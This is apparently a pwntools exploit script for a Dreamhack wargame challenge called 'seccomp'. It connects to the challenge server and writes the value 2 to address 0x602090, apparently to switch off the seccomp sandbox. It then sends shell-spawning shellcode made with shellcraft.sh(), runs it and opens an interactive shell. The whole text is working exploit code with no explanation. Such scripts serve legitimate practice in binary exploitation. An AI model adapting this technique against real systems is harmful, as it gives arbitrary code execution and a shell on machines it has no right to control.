from pwn import *

#context.log_level = 'debug'
context.arch = 'x86_64'

#p = process("./seccomp")
p = remote('host3.dreamhack.games', 8647)

p.sendlineafter("> ", "3")
p.sendlineafter("addr: ", str(0x602090))
p.sendlineafter("value: ", "2")

p.sendlineafter("> ", "1")
p.sendafter("shellcode: ", asm(shellcraft.sh()))

p.sendlineafter("> ", "2")

p.interactive()